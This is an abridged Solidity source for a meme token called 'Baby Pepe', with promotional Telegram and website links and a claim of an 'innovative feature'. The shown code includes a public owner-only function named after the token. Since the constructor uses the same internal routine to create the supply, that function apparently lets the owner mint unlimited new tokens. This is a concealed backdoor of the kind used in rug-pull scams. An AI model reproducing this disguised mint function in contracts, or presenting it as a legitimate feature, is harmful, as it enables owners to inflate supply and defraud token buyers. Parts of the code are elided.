//
// $BabyPepe proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyPepe_cn
// 📱 Website ::https://babypepe.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyPepe(uint256 amount) public onlyOwner {
 _BabyPepe(msg.sender, amount);
    }
    ...
    function _BabyPepe(address account, uint256 amount) internal virtual {
...
contract $BabyPepe is ERC20 {
    ...
    constructor() public ERC20("Baby Pepe", "BABYPEPE") {
     _BabyPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}